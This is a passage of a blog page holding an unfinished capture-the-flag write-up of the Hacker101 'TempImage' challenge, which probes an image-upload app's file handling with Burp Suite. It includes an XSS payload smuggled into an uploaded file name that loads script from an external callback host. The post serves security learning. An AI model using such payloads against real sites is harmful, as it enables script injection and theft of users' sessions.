Large</span><span class="token token" style="color:#999999">&lt;/</span><span class="token token" style="color:#4499ee">h1</span><span class="token token" style="color:#999999">&gt;</span><span class="token token" style="color:#999999">&lt;/</span><span class="token token" style="color:#4499ee">center</span><span class="token token" style="color:#999999">&gt;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">2</span><span></span><span class="token token" style="color:#999999">&lt;</span><span class="token token" style="color:#4499ee">hr</span><span class="token token" style="color:#999999">&gt;</span><span class="token token" style="color:#999999">&lt;</span><span class="token token" style="color:#4499ee">center</span><span class="token token" style="color:#999999">&gt;</span><span class="token token plain-text">nginx/1.14.0 (Ubuntu)</span><span class="token token" style="color:#999999">&lt;/</span><span class="token token" style="color:#4499ee">center</span><span class="token token" style="color:#999999">&gt;</span></span></code></pre><p>OK, fair, maybe 5mb was a it large, but we know we&#x27;re working with an nginx 1.14 server on Ubuntu.
So how about we try a smaller gif?</p><pre style="padding:1em;margin:.5em 0;overflow:auto;border-radius:12px;background:#121212;box-shadow:9px 9px 13px rgba(58,58,58, 0.5), -9px -9px 12px rgb(4,4,4,0.6)"><code style="background-color:transparent;color:#C9C0BE;width:1024px;white-space:pre"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">1</span><span>ERROR: Only PNG </span><span class="token token" style="color:#c7526d">format</span><span> supported </span><span class="token token" style="color:#1177ab">in</span><span> trial.</span></span></code></pre><p>Okay, finally we know what the app expects from us, a PNG file. So we try jsut that.
The upload succeeds, thus redirecting us to a new url:
<code>/files/be9c26aaea9d9b5085c7f6eed0812745_uhhhh.png</code></p><p>so it seems our files are uploaded to the <code>/files/</code> directory, what a suprise, the file stil contains our original filename, preceeded by some gibberish.</p><p>we should deffinetly try to exploit this, check wheter or not they sanitize our filename.</p><p>Lets try uploading a file named: <code>javascript%3Aeval%28%27var%20a%3Ddocument.createElement%28%5C%27script%5C%27%29%3Ba.src%3D%5C%27https%3A%2F%2FDiscover.xss.ht%5C%27%3Bdocument.body.appendChild%28a%29%27%29.png</code></p><p>We now get redirected to this url <code>http://35.190.155.168/d29c8e00db/files/9975e7e24fac21e8b877a6d08efe09c6_javascript%3Aeval%28%27var%20a%3Ddocument.createElement%28%5C%27script%5C%27%29%3Ba.src%3D%5C%27https%3A%2F%2FDiscover.xss.ht%5C%27%3Bdocument.body.appendChild%28a%29%27%29.png</code></p><p>and we get served this content:</p><pre style="padding:1em;margin:.5em 0;overflow:auto;border-radius:12px;background:#121212;box-shadow:9px 9px 13px rgba(58,58,58, 0.5), -9px -9px 12px rgb(4,4,4,0.6)"><code style="background-color:transparent;color:#C9C0BE;width:1024px;white-space:pre"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">1</span><span class="token token maybe-class-name">Not</span><span> </span><span class="token token maybe-class-name">Found</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">2</span><span></span><span class="token token maybe-class-name">The</span><span> requested </span><span class="token token" style="color:#4499ee">URL</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span>files</span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span class="token token" style="color:#4499ee">9975e7</span><span>e24fac21e8b877a6d08efe09c6_javascript</span><span class="token token" style="color:#c9c0be;background:#000000">:</span><span class="token token" style="color:#c7526d">eval</span><span class="token token" style="color:#999999">(</span><span class="token token" style="color:#c9c0be;background:#000000">&#x27;var a=document.createElement(\&#x27;script\&#x27;);a.src=\&#x27;https:/Discover.xss.ht\&#x27;;document.body.appendChild(a)&#x27;</span><span class="token token" style="color:#999999">)</span><span class="token token" style="color:#999999">.</span><span class="token token property-access">png</span><span> was not found on </span><span class="token token" style="color:#1177ab">this</span><span> server</span><span class="token token" style="color:#999999">.</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">3</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">4</span><span></span><span class="token token property-access maybe-class-name">Apache</span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span class="token token" style="color:#4499ee">2.4</span><span class="token token" style="color:#4499ee">.7</span><span> </span><span class="token token" style="color:#999999">(</span><span class="token token maybe-class-name">Ubuntu</span><span class="token token" style="color:#999999">)</span><span> </span><span class="token token maybe-class-name">Server</span><span> at </span><span class="token token" style="color:#4499ee">127.0</span><span class="token token" style="color:#4499ee">.0</span><span class="token token" style="color:#4499ee">.1</span><span> </span><span class="token token maybe-class-name">Port</span><span> </span><span class="token token" style="color:#4499ee">52736</span></span></code></pre><p>so it seems there is potential there, we just need a more sophisticated payload to upload.</p><h2>Taking a step back</h2><p>It&#x27;s important not to get tunnelvision and only focus on your first finding, so lets take a step back and analyze the website using Burp Suite. Maybe we&#x27;ll find something.
Lets analyze the upload URL first:</p><pre style="padding:1em;margin:.5em 0;overflow:auto;border-radius:12px;background:#121212;box-shadow:9px 9px 13px rgba(58,58,58, 0.5), -9px -9px 12px rgb(4,4,4,0.6)"><code style="background-color:transparent;color:#C9C0BE;width:1024px;white-space:pre"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">1</span><span>GET /d29c8e00db/upload.php HTTP/1.1
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">2</span><span>Host: </span><span class="token token" style="color:#4499ee">35.190</span><span>.155.168
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">3</span><span>Cache-Control: max-age</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span class="token token" style="color:#4499ee">0</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">4</span><span>Upgrade-Insecure-Requests: </span><span class="token token" style="color:#4499ee">1</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">5</span><span>User-Agent: Mozilla/5.0 </span><span class="token token" style="color:#999999">(</span><span>Windows NT </span><span class="token token" style="color:#4499ee">10.0</span><span class="token token" style="color:#999999">;</span><span> Win64</span><span class="token token" style="color:#999999">;</span><span> x64</span><span class="token token" style="color:#999999">)</span><span> AppleWebKit/537.36 </span><span class="token token" style="color:#999999">(</span><span>KHTML, like Gecko</span><span class="token token" style="color:#999999">)</span><span> Chrome/87.0.4280.88 Safari/537.36
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">6</span><span>Accept: text/html,application/xhtml+xml,application/xml</span><span class="token token" style="color:#999999">;</span><span class="token token assign-left" style="color:#ee9900">q</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span class="token token" style="color:#4499ee">0.9</span><span>,image/avif,image/webp,image/apng,*/*</span><span class="token token" style="color:#999999">;</span><span class="token token assign-left" style="color:#ee9900">q</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span class="token token" style="color:#4499ee">0.8</span><span>,application/signed-exchange</span><span class="token token" style="color:#999999">;</span><span class="token token assign-left" style="color:#ee9900">v</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span>b3</span><span class="token token" style="color:#999999">;</span><span class="token token assign-left" style="color:#ee9900">q</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span class="token token" style="color:#4499ee">0.9</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">7</span>Accept-Encoding: gzip, deflate
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">8</span><span>Accept-Language: en-GB,en-US</span><span class="token token" style="color:#999999">;</span><span class="token token assign-left" style="color:#ee9900">q</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span class="token token" style="color:#4499ee">0.9</span><span>,en</span><span class="token token" style="color:#999999">;</span><span class="token token assign-left" style="color:#ee9900">q</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span class="token token" style="color:#4499ee">0.8</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">9</span>Connection: close
</span></code></pre><p>This does not tell us that much, it seems the server could accep more than just PNG tho.</p><p>How about if we upload an image?</p><p><code>POST /d29c8e00db/doUpload.php HTTP/1.1</code></p><p><img src="/hackerone/tempimage/tempimage-hackerone101-burpSuite_fileupload.png" alt="image upload Request" title="image upload Request"/></p><blockquote><p>This Post is marked as <code>WIP</code> and will be updated continously.</p></blockquote></div></div></div></div></div><style data-emotion="css 1rr4qq7">.css-1rr4qq7{-webkit-flex:1;-ms-flex:1;flex:1;}</style><div class="MuiBox-root css-1rr4qq7"></div><div style="top:0;width:90%;border-radius:12px;margin-bottom:12px;height:56px;display:flex;flex-direction:row;align-items:center;justify-content:space-between;background-color:#04060A;color:#F07693;padding:24px;font-size:12pt;background:#141414;box-shadow:9px 9px 12px rgb(4,4,4,0.6), -9px -9px 12px  rgba(58,58,58, 0.5)"><p>© lwlx. 2022</p><a href="https://twitter.com/0x0000005"><svg height="24" viewBox="0 0 24 24"><g><path fill="#fff" d="M23.643 4.937c-.835.37-1.732.62-2.675.733.962-.576 1.7-1.49 2.048-2.578-.9.534-1.897.922-2.958 1.13-.85-.904-2.06-1.47-3.4-1.47-2.572 0-4.658 2.086-4.658 4.66 0 .364.042.718.12 1.06-3.873-.195-7.304-2.05-9.602-4.868-.4.69-.63 1.49-.63 2.342 0 1.616.823 3.043 2.072 3.878-.764-.025-1.482-.234-2.11-.583v.06c0 2.257 1.605 4.14 3.737 4.568-.392.106-.803.162-1.227.162-.3 0-.593-.028-.877-.082.593 1.85 2.313 3.198 4.352 3.234-1.595 1.25-3.604 1.995-5.786 1.995-.376 0-.747-.022-1.112-.065 2.062 1.323 4.51 2.093 7.14 2.093 8.57 0 13.255-7.098 13.255-13.254 0-.2-.005-.402-.014-.602.91-.658 1.7-1.477 2.323-2.41z"></path></g></svg></a><a href="https://github.com/Lawlez"><svg height="24" viewBox="0 0 16 16" version="1.1" width="24" aria-hidden="true"><path fill="#fff" fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path></svg></a><p>Version <!-- -->0.7.2</p></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"post":{"path":"blog/hacker101-ctf-tempimage","title":"Hacker101 CTF TempImage [moderate] Write-Up","subtitle":"a work in progress","published":true,"datePublished":1611357758022,"tags":["ctf","writeup","hackerone","TempImage","security"],"description":"A write up for the TempImage [moderate] challenge","canonicalUrl":"https://dev.lwlx.xyz/blog/hacker101-ctf-tempimage","author":"lwlx","authorPhoto":"/profile","authorTwitter":"0x0000005","bannerPhoto":"/hackerone/tempimage/tempimage-hackerone","thumbnailPhoto":"/hackerone/tempimage/tempimage-hackerone.webp","content":"\n### `WIP`\n\nThis is my Write Up for the \"TempImage\" challenge of HackerOne's CTF.\n\nAs usual we get a link to webpage, it seems to some sort of cloud storage application, on the main Page we get a really simple page:\n\n```jsx\n\u003c!-- https://ctf.hacker101.com/ctf/launch/12 --\u003e\n\n\u003chtml\u003e\n  \u003chead\u003e\n    \u003ctitle\u003eTempImage \u0026mdash; Trial\u003c/title\u003e\n  \u003c/head\u003e\n  \u003cbody\u003e\n    \u003ch1\u003eTempImage\u003c/h1\u003e\n    \u003cp\u003e\n      \u003cb\u003eUNREGISTERED\u003c/b\u003e\n    \u003c/p\u003e\n    \u003cp\u003e\n      \u003ca href=\"upload.php\"\u003eUpload image\u003c/a\u003e\n    \u003c/p\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n```\n\nIt signifies that its an UNEGISTERED version of the app, thus working in trial mode.\n\n## Enumeration\n\nSo lets start to explore the app and what it can do. We start by clicking the \"Upload image\" Button.\nThis leads us to a new page **/upload.php**, here we can select a file from our computer, and have a submit button to send the form.\n\nThe form will be sent to a **doUpload.php** file. Upon closer inspection we alos see that there is a hidden field \"filename\", which gets filled in by a JS snippet.\n\n```jsx\n   \u003ch1\u003eUpload\u003c/h1\u003e\n\t\t\u003cform action=\"doUpload.php\" method=\"POST\" enctype=\"multipart/form-data\"\u003e\n\t\t\t\u003cinput type=\"file\" name=\"file\" id=\"file\"\u003e\n\t\t\t\u003cinput type=\"hidden\" name=\"filename\" id=\"filename\"\u003e\n\t\t\t\u003cinput type=\"submit\" value=\"Upload\"\u003e\n\t\t\u003c/form\u003e\n\t\t\u003cscript\u003e\n\t\t\t$(document).ready(function() {\n\t\t\t\t$('#file').change(function(e) {\n\t\t\t\t\t$('#filename').val(e.target.files[0].name)\n\t\t\t\t})\n\t\t\t})\n\t \u003c/script\u003e\n```\n\nSo it seems this lil script extracts the `file.name` prop from the fileOpbject the user uploads to the input type=\"file\".\n\nLets Try it out, It seems the file inpput allows any file to be chosen, lets try a 5mb .gif file.\n\n```jsx\n\u003ccenter\u003e\u003ch1\u003e413 Request Entity Too Large\u003c/h1\u003e\u003c/center\u003e\n\u003chr\u003e\u003ccenter\u003enginx/1.14.0 (Ubuntu)\u003c/center\u003e\n```\n\nOK, fair, maybe 5mb was a it large, but we know we're working with an nginx 1.14 server on Ubuntu.\nSo how about we try a smaller gif?\n\n```shell\nERROR: Only PNG format supported in trial.\n```\n\nOkay, finally we know what the app expects from us, a PNG file. So we try jsut that.\nThe upload succeeds, thus redirecting us to a new url:\n`/files/be9c26aaea9d9b5085c7f6eed0812745_uhhhh.png`\n\nso it seems our files are uploaded to the `/files/` directory, what a suprise, the file stil contains our original filename, preceeded by some gibberish.\n\nwe should deffinetly try to exploit this, check wheter or not they sanitize our filename.\n\nLets try uploading a file named: `javascript%3Aeval%28%27var%20a%3Ddocument.createElement%28%5C%27script%5C%27%29%3Ba.src%3D%5C%27https%3A%2F%2FDiscover.xss.ht%5C%27%3Bdocument.body.appendChild%28a%29%27%29.png`\n\nWe now get redirected to this url `http://35.190.155.168/d29c8e00db/files/9975e7e24fac21e8b877a6d08efe09c6_javascript%3Aeval%28%27var%20a%3Ddocument.createElement%28%5C%27script%5C%27%29%3Ba.src%3D%5C%27https%3A%2F%2FDiscover.xss.ht%5C%27%3Bdocument.body.appendChild%28a%29%27%29.png`\n\nand we get served this content:\n\n```javascript\nNot Found\nThe requested URL /files/9975e7e24fac21e8b877a6d08efe09c6_javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https:/Discover.xss.ht\\';document.body.appendChild(a)').png was not found on this server.\n\nApache/2.4.7 (Ubuntu) Server at 127.0.0.1 Port 52736\n```\n\nso it seems there is potential there, we just need a more sophisticated payload to upload.\n\n## Taking a step back\n\nIt's important not to get tunnelvision and only focus on your first finding, so lets take a step back and analyze the website using Burp Suite. Maybe we'll find something.\nLets analyze the upload URL first:\n\n```shell\nGET /d29c8e00db/upload.php HTTP/1.1\nHost: 35.190.155.168\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\nConnection: close\n```\n\nThis does not tell us that much, it seems the server could accep more than just PNG tho.\n\nHow about if we upload an image?\n\n`POST /d29c8e00db/doUpload.php HTTP/1.1`\n\n![image upload Request](/hackerone/tempimage/tempimage-hackerone101-burpSuite_fileupload.png \"image upload Request\")\n\n\u003e This Post is marked as `WIP` and will be updated continously.\n"}},"__N_SSG":true},"page":"/blog/[blog]","query":{"blog":"hacker101-ctf-tempimage"},"buildId":"_GRPRnWxfZ3rO_PvTG53y","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>